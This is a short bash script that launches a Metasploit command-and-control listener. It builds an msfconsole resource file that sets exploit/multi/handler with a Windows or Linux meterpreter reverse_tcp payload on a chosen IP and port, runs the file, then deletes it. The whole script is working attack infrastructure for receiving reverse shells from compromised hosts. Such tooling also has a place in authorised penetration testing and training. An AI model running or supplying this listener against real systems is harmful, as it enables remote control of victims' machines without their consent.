#!/bin/bash
if [ $# -ne 3 ] && [ $# -ne 4 ]
then
	echo "Usage: $0 <payload_sys_type> <payload_arch> [<listening_IP>] <listening_port>" 
	exit
fi

echo "Launching Command & Control"

if [ $# -eq 3 ]
then
	IP=$(hostname -I)
	PORT=$3
else
	IP=$3
	PORT=$4
fi

echo "Working with IP:PORT -> ${IP}:${PORT}"

pyld_arch="/$2"

if [ $1 == "windows" ]
then
	if [ $2 == "x86" ]
	then
		pyld_arch=""
	fi
elif [ ! $1 == "linux" ]
then
	echo -e "Wrong system type! Options:\n\twindows\n\tlinux"
	exit
fi

if [ $2 != "x86" ] && [ $2 != "x64" ]
then
	echo -e "Wrong architecture! Options:\n\tx86\n\tx64"
	exit
fi

echo -e "use exploit/multi/handler\nset PAYLOAD $1$pyld_arch/meterpreter/reverse_tcp\nset LHOST $IP\nset LPORT $PORT\nexploit" > c_c.rc
msfconsole -r c_c.rc

echo -e "\nDone!\nCleaning up..."
rm c_c.rc
